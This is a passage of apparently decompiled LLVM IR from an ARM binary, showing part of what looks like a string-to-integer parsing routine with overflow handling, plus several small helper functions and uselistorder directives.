  %v2_164fc = add i32 %v0_164fc, ptrtoint (i32* @global_var_19fe6.644 to i32)
  %v3_164fc = inttoptr i32 %v2_164fc to i8*
  %v4_164fc = load i8, i8* %v3_164fc, align 1
  %tmp244 = icmp ult i8 %v4_164fc, 10
  br i1 %tmp244, label %.thread145, label %dec_label_pc_16310

.thread145:                                       ; preds = %dec_label_pc_164f8
  %v6_164fc = zext i8 %v4_164fc to i32
  br label %dec_label_pc_16380

dec_label_pc_16510:                               ; preds = %dec_label_pc_164dc
  %tmp245 = icmp ugt i32 %v0_16528, -1717986919
  br i1 %tmp245, label %dec_label_pc_164e4, label %dec_label_pc_164e0

dec_label_pc_16528:                               ; preds = %dec_label_pc_164e4
  %v2_16528 = mul i32 %v0_16528, 2
  store i32 %v2_16528, i32* %r1.global-to-local, align 4
  %v3_16528 = icmp ult i32 %v2_16528, %v0_16528
  %v3_1652c = mul i32 %v0_1652c, 2
  %v4_1652c = zext i1 %v3_16528 to i32
  %v5_1652c = or i32 %v4_1652c, %v3_1652c
  store i32 %v5_1652c, i32* %r2.global-to-local, align 4
  %v3_16534 = mul i32 %v5_1652c, 4
  %tmp205 = udiv i32 %v0_16528, 536870912
  %v4_16538 = urem i32 %tmp205, 4
  %v5_16538 = or i32 %v3_16534, %v4_16538
  %v2_16544 = mul i32 %v0_16528, 10
  store i32 %v2_16544, i32* @r8, align 4
  %v1_1654c = and i32 %v0_164f0, 1073741824
  %v2_1654c = icmp ne i32 %v1_1654c, 0
  %v3_1654c = ashr i32 %v0_164f0, 31
  %v4_16558 = zext i1 %v2_1654c to i32
  %v3_16558 = add i32 %v4_16558, %v5_1652c
  %v5_16558 = add i32 %v3_16558, %v5_16538
  store i32 %v5_16558, i32* @sb, align 4
  %tmp246 = lshr i32 %v0_164f0, 31
  %v1_1655c = add nsw i32 %tmp246, -1
  store i32 %v1_1655c, i32* @r4, align 4
  %v3_16560 = icmp uge i32 %v5_16558, %v1_1655c
  %v9_16560 = icmp eq i32 %v5_16558, %v1_1655c
  %v1_16564 = sub i32 -1, %v0_164f0
  %v2_16568 = xor i1 %v9_16560, true
  %v3_16568 = and i1 %v3_16560, %v2_16568
  br i1 %v3_16568, label %dec_label_pc_164f0, label %dec_label_pc_1656c

dec_label_pc_1656c:                               ; preds = %dec_label_pc_16528
  br i1 %v9_16560, label %dec_label_pc_165b0, label %dec_label_pc_16570

dec_label_pc_16570:                               ; preds = %dec_label_pc_165b0, %dec_label_pc_1656c
  %v0_16570 = load i32, i32* @sl, align 4
  %v1_16570 = add i32 %v0_16570, 4
  %v2_16570 = inttoptr i32 %v1_16570 to i32*
  %v3_16570 = load i32, i32* %v2_16570, align 4
  store i32 %v3_16570, i32* %r2.global-to-local, align 4
  %v1_16574 = add i32 %v0_16570, 104
  %v2_16574 = inttoptr i32 %v1_16574 to i32*
  %v3_16574 = load i32, i32* %v2_16574, align 4
  %v3_16578 = icmp ult i32 %v3_16570, %v3_16574
  br i1 %v3_16578, label %.thread52.dec_label_pc_16588_crit_edge, label %dec_label_pc_165a0

.thread52.dec_label_pc_16588_crit_edge:           ; preds = %dec_label_pc_16570
  %v2_1657c = inttoptr i32 %v3_16570 to i8*
  %v3_1657c = load i8, i8* %v2_1657c, align 1
  %v4_1657c = zext i8 %v3_1657c to i32
  store i32 %v4_1657c, i32* @r5, align 4
  %v6_1657c = add i32 %v3_16570, 1
  store i32 %v6_1657c, i32* %r2.global-to-local, align 4
  store i32 %v6_1657c, i32* %v2_16570, align 4
  %v0_16598.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16588

dec_label_pc_16588:                               ; preds = %.thread52.dec_label_pc_16588_crit_edge, %dec_label_pc_165a0
  %v0_16598 = phi i32 [ %v0_16598.pre, %.thread52.dec_label_pc_16588_crit_edge ], [ %v1_165a4, %dec_label_pc_165a0 ]
  store i32 %v0_164f0, i32* %r1.global-to-local, align 4
  store i32 %v3_1654c, i32* @r2, align 4
  %v0_16590 = load i32, i32* @r8, align 4
  %v2_16590 = add i32 %v0_16590, %v0_164f0
  store i32 %v2_16590, i32* @r6, align 4
  %v3_16590 = icmp ult i32 %v2_16590, %v0_16590
  %v0_16594 = load i32, i32* @sb, align 4
  %v3_16594 = add i32 %v0_16594, %v3_1654c
  %v4_16594 = zext i1 %v3_16590 to i32
  %v5_16594 = add i32 %v4_16594, %v3_16594
  store i32 %v5_16594, i32* @r7, align 4
  %v1_16598 = add i32 %v0_16598, -48
  store i32 %v1_16598, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_164c0

dec_label_pc_165a0:                               ; preds = %dec_label_pc_16570
  store i32 %v0_16570, i32* %r0.global-to-local, align 4
  %v1_165a4 = call i32 @function_1677c(i32 %v0_16570)
  store i32 %v1_165a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16588

dec_label_pc_165b0:                               ; preds = %dec_label_pc_1656c
  %tmp247 = icmp ugt i32 %v2_16544, %v1_16564
  br i1 %tmp247, label %dec_label_pc_164f0, label %dec_label_pc_16570

dec_label_pc_165bc:                               ; preds = %dec_label_pc_162e4
  %v2_165c0 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_165c0, i32* @r6, align 4
  store i32 %arg5, i32* @r7, align 4
  br label %dec_label_pc_16310

dec_label_pc_165c8:                               ; preds = %dec_label_pc_16334
  %v0_165c8 = call i32 @function_12ecc()
  %v2_165d0 = load i32, i32* %stack_var_0, align 4
  %v2_165d8 = add i32 %v2_165d0, -1
  %v3_165d8 = icmp ne i32 %v2_165d0, 0
  %v3_165e0 = add i32 %arg5, -1
  %v4_165e0 = zext i1 %v3_165d8 to i32
  %v5_165e0 = add i32 %v3_165e0, %v4_165e0
  store i32 %v2_165d8, i32* %stack_var_0, align 4
  store i32 34, i32* %r2.global-to-local, align 4
  %v2_165f0 = inttoptr i32 %v0_165c8 to i32*
  store i32 34, i32* %v2_165f0, align 4
  %v2_165f8 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_165f8, i32* %r0.global-to-local, align 4
  store i32 %v5_165e0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16218

dec_label_pc_16600:                               ; preds = %dec_label_pc_16330
  %v1_16604 = load i32, i32* @r6, align 4
  %tmp248 = icmp ugt i32 %v3_16600, %v1_16604
  br i1 %tmp248, label %dec_label_pc_163b8, label %dec_label_pc_16334

dec_label_pc_16610:                               ; preds = %dec_label_pc_163b4
  %v0_16614 = load i32, i32* @r6, align 4
  %tmp249 = icmp ugt i32 %v0_16614, %v3_16600
  br i1 %tmp249, label %dec_label_pc_16354, label %dec_label_pc_163b8

dec_label_pc_16620:                               ; preds = %dec_label_pc_160e0
  store i32 %v0_160e0, i32* %r0.global-to-local, align 4
  %v1_16624 = call i32 @function_1677c(i32 %v0_160e0)
  store i32 %v1_16624, i32* %r0.global-to-local, align 4
  store i32 %v1_16624, i32* @r5, align 4
  br label %dec_label_pc_160f8

dec_label_pc_16630:                               ; preds = %dec_label_pc_160f8
  %v0_16630 = load i32, i32* @sl, align 4
  %v1_16630 = add i32 %v0_16630, 4
  %v2_16630 = inttoptr i32 %v1_16630 to i32*
  %v3_16630 = load i32, i32* %v2_16630, align 4
  store i32 %v3_16630, i32* %r2.global-to-local, align 4
  %v1_16634 = add i32 %v0_16630, 104
  %v2_16634 = inttoptr i32 %v1_16634 to i32*
  %v3_16634 = load i32, i32* %v2_16634, align 4
  %v3_16638 = icmp ult i32 %v3_16630, %v3_16634
  br i1 %v3_16638, label %.thread54.dec_label_pc_16648_crit_edge, label %dec_label_pc_166b0

.thread54.dec_label_pc_16648_crit_edge:           ; preds = %dec_label_pc_16630
  %v2_1663c = inttoptr i32 %v3_16630 to i8*
  %v3_1663c = load i8, i8* %v2_1663c, align 1
  %v4_1663c = zext i8 %v3_1663c to i32
  store i32 %v4_1663c, i32* %r0.global-to-local, align 4
  %v6_1663c = add i32 %v3_16630, 1
  store i32 %v6_1663c, i32* %r2.global-to-local, align 4
  store i32 %v6_1663c, i32* %v2_16630, align 4
  %v0_1664c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16648

dec_label_pc_16648:                               ; preds = %.thread54.dec_label_pc_16648_crit_edge, %dec_label_pc_166b0
  %v0_1664c = phi i32 [ %v0_1664c.pre, %.thread54.dec_label_pc_16648_crit_edge ], [ %v1_166b4, %dec_label_pc_166b0 ]
  %v2_1664c = add i32 %v0_1664c, ptrtoint (i32* @global_var_19fe6.644 to i32)
  %v3_1664c = inttoptr i32 %v2_1664c to i8*
  %v4_1664c = load i8, i8* %v3_1664c, align 1
  %v6_1664c = zext i8 %v4_1664c to i32
  store i32 %v6_1664c, i32* @fp, align 4
  %tmp250 = icmp ult i8 %v4_1664c, 16
  br i1 %tmp250, label %.thread156, label %dec_label_pc_16664

.thread156:                                       ; preds = %dec_label_pc_16648
  store i32 16, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16060

dec_label_pc_16664:                               ; preds = %dec_label_pc_16648
  %v0_16664 = load i32, i32* @sl, align 4
  %v1_16664 = add i32 %v0_16664, 104
  %v2_16664 = inttoptr i32 %v1_16664 to i32*
  %v3_16664 = load i32, i32* %v2_16664, align 4
  store i32 %v3_16664, i32* %r2.global-to-local, align 4
  %v2_16668 = icmp eq i32 %v3_16664, 0
  br i1 %v2_16668, label %.thread57, label %bb206

bb206:                                            ; preds = %dec_label_pc_16664
  %v2_1666c = add i32 %v0_16664, 4
  %v3_1666c = inttoptr i32 %v2_1666c to i32*
  %v4_1666c = load i32, i32* %v3_1666c, align 4
  %v2_16670 = add i32 %v4_1666c, -1
  store i32 %v2_16670, i32* %v3_1666c, align 4
  br label %.thread57

.thread57:                                        ; preds = %dec_label_pc_16664, %bb206
  %v0_16678 = load i32, i32* @r6, align 4
  %v2_16678 = icmp eq i32 %v0_16678, 0
  br i1 %v2_16678, label %dec_label_pc_166bc, label %dec_label_pc_16680

dec_label_pc_16680:                               ; preds = %.thread57
  %v0_16680 = load i32, i32* %r2.global-to-local, align 4
  %v2_16680 = icmp eq i32 %v0_16680, 0
  br i1 %v2_16680, label %dec_label_pc_166e8, label %dec_label_pc_16688

dec_label_pc_16688:                               ; preds = %dec_label_pc_16680
  %v0_16688 = load i32, i32* @sl, align 4
  %v1_16688 = add i32 %v0_16688, 4
  %v2_16688 = inttoptr i32 %v1_16688 to i32*
  %v3_16688 = load i32, i32* %v2_16688, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_16694 = add i32 %v3_16688, -1
  store i32 0, i32* %stack_var_0, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v1_16694, i32* %v2_16688, align 4
  %v1_16220.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16218

dec_label_pc_166b0:                               ; preds = %dec_label_pc_16630
  store i32 %v0_16630, i32* %r0.global-to-local, align 4
  %v1_166b4 = call i32 @function_1677c(i32 %v0_16630)
  store i32 %v1_166b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16648

dec_label_pc_166bc:                               ; preds = %.thread57
  %v0_166bc = load i32, i32* @sl, align 4
  store i32 %v0_166bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v8_166c8 = call i32 @function_16718(i32 %v0_166bc, i32 %tmp, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_0, align 4
  br label %dec_label_pc_16218

dec_label_pc_166e8:                               ; preds = %dec_label_pc_16680
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_0, align 4
  br label %dec_label_pc_16218

; uselistorder directives
  uselistorder i32 %v1_166b4, { 1, 0 }
  uselistorder i32 %v6_1664c, { 1, 0 }
  uselistorder i32 %v3_16630, { 1, 0, 2, 3 }
  uselistorder i32 %v1_16624, { 1, 2, 0 }
  uselistorder i32 %v2_165f8, { 1, 0 }
  uselistorder i32 %v1_165a4, { 1, 0 }
  uselistorder i32 %v1_16598, { 1, 0 }
  uselistorder i32 %v5_16594, { 1, 0 }
  uselistorder i32 %v2_16590, { 1, 2, 0 }
  uselistorder i32 %v0_16590, { 1, 0 }
  uselistorder i32 %v0_16598, { 1, 0 }
  uselistorder i32 %v3_16570, { 1, 0, 2, 3 }
  uselistorder i1 %v9_16560, { 1, 0 }
  uselistorder i32 %v5_1652c, { 1, 0, 2 }
  uselistorder i8 %v4_164fc, { 1, 0 }
  uselistorder i1 %v9_164d0, { 1, 0 }
  uselistorder i1 %v7_164c4, { 1, 0 }
  uselistorder i32 %v0_164f0, { 2, 3, 0, 1, 5, 4, 6, 7 }
  uselistorder i32 %v0_1652c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v0_16528, { 3, 2, 4, 1, 0 }
  uselistorder i32 %v1_16488, { 1, 0 }
  uselistorder i32 %v3_1646c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16450, { 2, 0, 1 }
  uselistorder i64 %v4_16448, { 1, 0 }
  uselistorder i32 %v5_16410, { 1, 0 }
  uselistorder i32 %v0_16408, { 1, 0 }
  uselistorder i32 %v2_163cc, { 2, 1, 0 }
  uselistorder i32 %v2_163c4, { 1, 0 }
  uselistorder i32 %v3_163c0, { 1, 0 }
  uselistorder i32 %v1_16370, { 1, 0 }
  uselistorder i32 %v3_1638c, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-60.2.off0, { 0, 2, 1 }
  uselistorder i32 %v2_16364, { 1, 0 }
  uselistorder i32 %v3_16600, { 1, 0, 2, 3 }
  uselistorder i1 %v9_16328, { 1, 2, 0 }
  uselistorder i32 %v1_16328, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-44.2, { 3, 2, 0, 4, 1 }
  uselistorder i32 %v1_162c8, { 0, 2, 1 }
  uselistorder i32 %v0_162d0, { 1, 0, 3, 2 }
  uselistorder i32 %v1_16290, { 1, 0 }
  uselistorder i32 %v3_1625c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16240, { 1, 0 }
  uselistorder i32 %v0_161ec, { 1, 0 }
  uselistorder i32 %v1_16184, { 1, 0 }
  uselistorder i32 %v3_161b4, { 1, 0, 2, 3 }
  uselistorder i1 %v2_161a8, { 1, 0 }
  uselistorder i32 %v0_164b8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_16188, { 1, 0 }
  uselistorder i32 %v0_1619c, { 1, 0 }
  uselistorder i32 %v1_16130, { 1, 0 }
  uselistorder i32 %v3_16164, { 1, 0, 2, 3 }
  uselistorder i1 %v3_16158, { 1, 0 }
  uselistorder i32 %v4_16114, { 1, 0 }
  uselistorder i32 %v0_16110, { 1, 2, 0 }
  uselistorder i32 %v3_160e0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_160d8, { 1, 0 }
  uselistorder i32 %v1_160d0, { 1, 0 }
  uselistorder i32 %v3_160b4, { 1, 0, 2, 3 }
  uselistorder i1 %v2_160a8, { 1, 0 }
  uselistorder i32 %v0_1624c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_16060, { 18, 17, 16, 7, 13, 12, 0, 1, 2, 8, 9, 10, 15, 5, 3, 6, 14, 11, 19, 4 }
  uselistorder i32 %v4_1615c107, { 1, 0 }
  uselistorder i32 %v0_16048, { 0, 2, 1, 3 }
  uselistorder i32 %v0_16030, { 1, 2, 0 }
  uselistorder i32 %v0_16024143, { 1, 0 }
  uselistorder i32 %v3_15fd8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_15fa4, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v3_15f88, { 2, 3, 0, 1 }
  uselistorder i32* %v2_15f88, { 1, 0 }
  uselistorder i32 %v2_15f98, { 0, 1, 3, 2 }
  uselistorder i32 %v0_15f78, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 5, 6, 7, 8, 9, 10, 4, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %tmp, { 6, 5, 1, 4, 2, 3, 8, 9, 7, 0, 10 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 28, 29, 30, 25, 26, 27, 31, 32, 33, 34, 35, 36, 37, 38, 1, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 48, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 23, 19, 20, 21, 22, 24, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 10, 7, 5, 6, 8, 9, 13, 11, 12, 17, 15, 14, 16, 19, 18, 23, 20, 21, 22, 55, 24, 26, 25, 31, 27, 28, 29, 30, 38, 35, 32, 33, 34, 36, 37, 40, 39, 45, 41, 42, 43, 44, 49, 46, 47, 48, 53, 50, 51, 52, 54, 56, 0, 1 }
  uselistorder i32 536870912, { 2, 0, 1, 3 }
  uselistorder i8 10, { 0, 6, 1, 5, 7, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_16718, { 2, 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_19fe5.646 to i32), i32 1), { 1, 5, 4, 3, 2, 0, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_19fe6.644 to i32), { 0, 1, 3, 2 }
  uselistorder i32 43, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 45, { 4, 0, 5, 3, 1, 6, 2, 7 }
  uselistorder i32 (i32)* @function_1677c, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 37, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* @fp, { 76, 0, 78, 77, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 142, 143, 144, 145, 106, 107, 108, 97, 98, 99, 100, 101, 102, 103, 1, 104, 105, 4, 5, 6, 7, 8, 9, 10, 11, 17, 18, 12, 13, 14, 15, 16, 19, 20, 90, 89, 91, 92, 93, 94, 23, 24, 25, 26, 27, 28, 29, 30, 31, 21, 22, 2, 32, 33, 34, 35, 36, 3, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 56, 52, 53, 54, 55, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 95, 96, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141 }
  uselistorder i32 %arg5, { 3, 7, 8, 0, 9, 4, 5, 1, 2, 6 }
  uselistorder label %.thread57, { 1, 0 }
  uselistorder label %dec_label_pc_16648, { 1, 0 }
  uselistorder label %dec_label_pc_16588, { 1, 0 }
  uselistorder label %dec_label_pc_164f0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_164e4, { 0, 2, 1 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
  uselistorder label %dec_label_pc_16468, { 1, 0 }
  uselistorder label %dec_label_pc_16400, { 1, 0 }
  uselistorder label %dec_label_pc_163f4, { 1, 0 }
  uselistorder label %dec_label_pc_16380, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_16374, { 1, 0 }
  uselistorder label %dec_label_pc_16334, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %dec_label_pc_16310, { 5, 3, 4, 1, 2, 6, 0 }
  uselistorder label %bb198, { 1, 0 }
  uselistorder label %dec_label_pc_162a4, { 2, 1, 0 }
  uselistorder label %bb196, { 1, 0 }
  uselistorder label %dec_label_pc_16274, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %bb193, { 1, 0 }
  uselistorder label %dec_label_pc_161a0, { 1, 0 }
  uselistorder label %dec_label_pc_16188, { 1, 0 }
  uselistorder label %dec_label_pc_16164, { 1, 0 }
  uselistorder label %dec_label_pc_1614c, { 1, 0 }
  uselistorder label %dec_label_pc_16134, { 1, 0 }
  uselistorder label %dec_label_pc_160f8, { 1, 0 }
  uselistorder label %dec_label_pc_160d8, { 1, 0 }
  uselistorder label %dec_label_pc_160b4, { 1, 0 }
  uselistorder label %dec_label_pc_160a4, { 1, 0 }
  uselistorder label %dec_label_pc_16094, { 1, 0 }
  uselistorder label %dec_label_pc_16038, { 1, 0 }
  uselistorder label %bb184, { 1, 0 }
  uselistorder label %dec_label_pc_16018, { 1, 0 }
  uselistorder label %bb182, { 1, 0 }
  uselistorder label %dec_label_pc_16000, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15ff0, { 1, 0 }
  uselistorder label %dec_label_pc_15f88, { 1, 0 }
  uselistorder label %dec_label_pc_15f88.backedge, { 3, 0, 2, 1 }
}

define i32 @function_16710() local_unnamed_addr {
dec_label_pc_16710:
  %v0_16710 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16710, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_16710
  %v1_16710 = load i32, i32* @sb, align 4
  %v20_16710 = add i32 %v1_16710, 28
  %v21_16710 = inttoptr i32 %v20_16710 to i32*
  %v22_16710 = load i32, i32* %v21_16710, align 4
  call void @__pseudo_branch(i32 %v22_16710)
  %v0_16714.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16714.pr, label %.thread, label %bb1

bb1:                                              ; preds = %bb
  %v1_16714 = load i32, i32* @sb, align 4
  %v2_16714 = add i32 %v1_16714, 4
  %v3_16714 = inttoptr i32 %v2_16714 to i32*
  %v4_16714 = load i32, i32* %v3_16714, align 4
  %v23_16714 = add i32 %v1_16714, 32
  %v24_16714 = inttoptr i32 %v23_16714 to i32*
  %v25_16714 = load i32, i32* %v24_16714, align 4
  call void @__pseudo_branch(i32 %v25_16714)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16710, %bb, %bb1
  %.0 = phi i32 [ undef, %bb ], [ %v4_16714, %bb1 ], [ undef, %dec_label_pc_16710 ]
  ret i32 %.0

; uselistorder directives
  uselistorder label %.thread, { 2, 1, 0 }
}

define i32 @function_16718(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_16718:
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16718 = load i32, i32* @r4, align 4
  store i32 %v3_16718, i32* %stack_var_-8, align 4
  %v1_1671c = add i32 %arg1, 8
  %v2_1671c = inttoptr i32 %v1_1671c to i32*
  %v3_1671c = load i32, i32* %v2_1671c, align 4
  store i32 %v3_1671c, i32* @ip, align 4
  %v1_16720 = add i32 %arg1, 4
  %v2_16720 = inttoptr i32 %v1_16720 to i32*
  %v3_16720 = load i32, i32* %v2_16720, align 4
  store i32 %v3_16720, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v2_1672c = sub i32 %v3_1671c, %v3_16720
  store i32 %v2_1672c, i32* %r3.global-to-local, align 4
  %v2_16730 = or i32 %arg3, %arg2
  %v4_16730 = icmp eq i32 %v2_16730, 0
  %v3_16734 = ashr i32 %v2_1672c, 31
  store i32 %v3_16734, i32* %r4.global-to-local, align 4
  %v2_16738 = add i32 %arg1, 112
  %v3_16738 = inttoptr i32 %v2_16738 to i32*
  store i32 %arg2, i32* %v3_16738, align 4
  %v0_1673c = load i32, i32* %r2.global-to-local, align 4
  %v2_1673c = add i32 %arg1, 116
  %v3_1673c = inttoptr i32 %v2_1673c to i32*
  store i32 %v0_1673c, i32* %v3_1673c, align 4
  %v0_16740 = load i32, i32* %r3.global-to-local, align 4
  %v2_16740 = add i32 %arg1, 120
  %v3_16740 = inttoptr i32 %v2_16740 to i32*
  store i32 %v0_16740, i32* %v3_16740, align 4
  %v0_16744 = load i32, i32* %r4.global-to-local, align 4
  %v2_16744 = add i32 %arg1, 124
  %v3_16744 = inttoptr i32 %v2_16744 to i32*
  store i32 %v0_16744, i32* %v3_16744, align 4
  br i1 %v4_16730, label %dec_label_pc_16764, label %dec_label_pc_1674c

dec_label_pc_1674c:                               ; preds = %dec_label_pc_16718
  %v0_1674c = load i32, i32* %r4.global-to-local, align 4
  %v1_1674c = load i32, i32* %r2.global-to-local, align 4
  %v7_16750 = icmp sgt i32 %v0_1674c, %v1_1674c
  br i1 %v7_16750, label %dec_label_pc_1674c.dec_label_pc_16754_crit_edge, label %dec_label_pc_16760

dec_label_pc_1674c.dec_label_pc_16754_crit_edge:  ; preds = %dec_label_pc_1674c
  %v1_16754.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16754

dec_label_pc_16754:                               ; preds = %dec_label_pc_16770, %dec_label_pc_1674c.dec_label_pc_16754_crit_edge
  %v1_16754 = phi i32 [ %v1_16754.pre, %dec_label_pc_1674c.dec_label_pc_16754_crit_edge ], [ %v1_16770, %dec_label_pc_16770 ]
  %v0_16754 = load i32, i32* %lr.global-to-local, align 4
  %v2_16754 = add i32 %v0_16754, %v1_16754
  store i32 %v2_16754, i32* %r3.global-to-local, align 4
  %v2_16758 = add i32 %arg1, 104
  %v3_16758 = inttoptr i32 %v2_16758 to i32*
  store i32 %v2_16754, i32* %v3_16758, align 4
  br label %dec_label_pc_16768

dec_label_pc_16760:                               ; preds = %dec_label_pc_1674c
  %v9_1674c = icmp eq i32 %v0_1674c, %v1_1674c
  br i1 %v9_1674c, label %dec_label_pc_16770, label %dec_label_pc_16764

dec_label_pc_16764:                               ; preds = %dec_label_pc_16770, %dec_label_pc_16760, %dec_label_pc_16718
  %v0_16764 = load i32, i32* @ip, align 4
  %v2_16764 = add i32 %arg1, 104
  %v3_16764 = inttoptr i32 %v2_16764 to i32*
  store i32 %v0_16764, i32* %v3_16764, align 4
  br label %dec_label_pc_16768

dec_label_pc_16768:                               ; preds = %dec_label_pc_16754, %dec_label_pc_16764
  %v2_16768 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16768, i32* %r4.global-to-local, align 4
  ret i32 %arg1

dec_label_pc_16770:                               ; preds = %dec_label_pc_16760
  %v0_16770 = load i32, i32* %r3.global-to-local, align 4
  %v1_16770 = load i32, i32* %r1.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_16770, %v1_16770
  br i1 %tmp, label %dec_label_pc_16754, label %dec_label_pc_16764

; uselistorder directives
  uselistorder i32 %v1_1674c, { 1, 0 }
  uselistorder i32 %v0_1674c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 0, 1, 2, 8, 5, 7, 6, 4, 3 }
  uselistorder label %dec_label_pc_16768, { 1, 0 }
}

define i32 @function_1677c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1677c:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1677c = load i32, i32* @r4, align 4
  store i32 %v3_1677c, i32* %stack_var_-28, align 4
  %v1_16780 = add i32 %arg1, 112
  %v1_16784 = inttoptr i32 %v1_16780 to i32*
  %v2_16784 = load i32, i32* %v1_16784, align 4
  %v3_16784 = add i32 %arg1, 116
  %v4_16784 = inttoptr i32 %v3_16784 to i32*
  %v5_16784 = load i32, i32* %v4_16784, align 4
  store i32 %v5_16784, i32* @r2, align 4
  %v2_16788 = or i32 %v5_16784, %v2_16784
  %v4_16788 = icmp eq i32 %v2_16788, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v4_16788, label %dec_label_pc_167cc, label %dec_label_pc_16798

dec_label_pc_16798:                               ; preds = %dec_label_pc_1677c
  %v1_16798 = add i32 %arg1, 124
  %v2_16798 = inttoptr i32 %v1_16798 to i32*
  %v3_16798 = load i32, i32* %v2_16798, align 4
  %v5_167a0 = icmp slt i32 %v3_16798, %v5_16784
  br i1 %v5_167a0, label %dec_label_pc_167cc, label %dec_label_pc_167a4

dec_label_pc_167a4:                               ; preds = %dec_label_pc_16798
  %v9_1679c = icmp eq i32 %v3_16798, %v5_16784
  br i1 %v9_1679c, label %dec_label_pc_167c0, label %dec_label_pc_167a8

dec_label_pc_167a8:                               ; preds = %dec_label_pc_167c0, %dec_label_pc_167cc, %dec_label_pc_167a4
  %v1_167ac = phi i32 [ %arg1, %dec_label_pc_167c0 ], [ %arg1, %dec_label_pc_167a4 ], [ %v1_167ac.pre, %dec_label_pc_167cc ]
  %v2_167ac = add i32 %v1_167ac, 104
  %v3_167ac = inttoptr i32 %v2_167ac to i32*
  store i32 0, i32* %v3_167ac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_167b4

dec_label_pc_167b4:                               ; preds = %bb, %dec_label_pc_16824, %dec_label_pc_167a8
